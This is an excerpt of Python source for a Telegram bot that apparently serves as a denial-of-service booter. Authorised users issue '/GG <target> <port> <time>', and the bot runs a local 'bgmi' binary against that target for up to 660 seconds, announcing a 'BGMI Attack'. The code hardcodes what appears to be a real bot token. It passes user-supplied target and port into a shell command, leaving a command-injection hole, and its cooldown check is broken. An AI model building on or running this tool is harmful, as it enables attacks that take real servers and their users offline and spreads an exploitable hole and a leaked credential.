...
bot = telebot.TeleBot('6817087273:AAEXaBO2PRFd9w8HySwQx47t_OzOX2YQt5E')

# @PrivateFileTg # Admin user IDs
admin_id = ["6898246712","11810257080"]
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown . Please Wait 30sec Before Running The /GG Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # @PrivateFileTg # Updated to accept target, time, and port
            ...
            if time > 660:
                response = "Error: Time interval must be less than 660."
            else:
                record_command_logs(user_id, '/GG', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @PrivateFileTg # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 40"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /GG <target> <port> <time>"  # @PrivateFileTg # Updated command syntax
    else:
